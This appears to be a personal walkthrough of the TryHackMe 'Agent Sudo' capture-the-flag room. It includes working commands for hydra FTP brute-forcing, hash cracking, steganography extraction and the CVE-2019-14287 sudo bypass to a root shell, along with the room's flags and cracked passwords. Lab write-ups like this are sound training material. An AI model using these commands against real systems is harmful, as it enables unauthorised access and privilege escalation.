> Mon 04 Aug 2025
> al3xx

![[s10.png|350]]

# Agent Sudo [Link](https://tryhackme.com/room/agentsudoctf)

## 1. Reconnaissance
### TCP Scan
```bash
sudo nmap -sC -sV -T4 10.10.253.126 -oN tryhackme/nmap.txt
```


| Port | Service | Version                         |
| ---- | ------- | ------------------------------- |
| 21   | ftp     | vsftpd 3.0.3                    |
| 22   | ssh     | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 |
| 80   | http    | Apache httpd 2.4.29 ((Ubuntu))  |

## 2. Enumeration
### Web Enumeration
- Port **80** is open
- On visiting the page, a message suggests changing the `User-Agent` header.
- After cycling through various capital letters, discovered interaction with `User-Agent: C`.
```bash
curl http://10.10.253.126 -L -H "User-Agent: C"
```
Response:
```Text
Attention chris, <br><br>

Do you still remember our deal? Please tell agent J about the stuff ASAP. Also, change your god damn password, is weak! <br><br>

From,<br>
Agent R
```
* Discovered user `chris` and a possible password weakness.

### FTP Enumeration
- Port **21** is open
- Used the discovered username from HTTP (`chris`) to brute-force FTP login.

## 3. Exploitation
### FTP brute-force
```bash
hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://10.10.253.126
```
Result:
```bash
[21][ftp] host: 10.10.253.126   login: chris   password: crystal
```
- Logged into FTP:
```bash
ftp 10.10.253.126
Name (10.10.253.126:kali): chris
Password: crystal
```
Login successful

## 4. Post-Exploitation
#### **FTP Content**
```bash
-rw-r--r--    1 0        0             217 Oct 29  2019 To_agentJ.txt
-rw-r--r--    1 0        0           33143 Oct 29  2019 cute-alien.jpg
-rw-r--r--    1 0        0           34842 Oct 29  2019 cutie.png
```
**To_agentJ.txt:**
```TEXT
Dear agent J,

All these alien like photos are fake! Agent R stored the real picture inside your directory. Your login password is somehow stored in the fake picture. It shouldn't be a problem for you.

From,
Agent C
```

#### **cutie.png Analysis (binwalk + zip2john)**
```bash
binwalk -e cutie.png
```
Found `8702.zip` inside the image. Extracted and cracked the ZIP password:
```bash
$ zip2john 8702.zip > hash.txt
$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```
**Password:** `alien`
Unzipped:
```bash
7z x 8702.zip
```
Revealed:
```TEXT
Agent C,

We need to send the picture to 'QXJlYTUx' as soon as possible!

By,
Agent R
```
Decoded with Base64:
```bash
$ echo "QXJlYTUx" | base64 -d
```
**Output:** `Area51`

#### **cute-alien.jpg Analysis (steghide)**
```bash
steghide extract -sf cute-alien.jpg
```
Found:
```TEXT
Hi james,

Glad you find this message. Your login password is hackerrules!

Don't ask me why the password look cheesy, ask agent R who set this password for you.

Your buddy,
chris
```

#### User Flag
SSH into the box:
```
ssh james@10.10.253.126
```

```bash
cat ~/user_flag.txt
```
Flag: b03d975e8c92a7c04146cfa7a5a313c7
#### Root Flag
After privilege escalation:
```TEXT
cat /root/root.txt
```
**Flag:** `b53a02f55b57d4439e3341834d70c062`

## 5. Privilege Escalation
CVE-2019-14287 – Sudo Bypass
```bash
sudo -l
```
Output:
```bash
User james may run the following commands on this host:
    (ALL, !root) /bin/bash
```
Even though root is blacklisted, using `-u#-1` bypasses this:
```bash
sudo -u#-1 /bin/bash
```
You now have a root shell.

## 6. Lessons Learned / Notes
* **Tools or techniques to remember:**
	* `steghide`, `binwalk`, `zip2john`, `john`, `hydra`, `curl -H "User-Agent"`, `sudo -u#-1`.
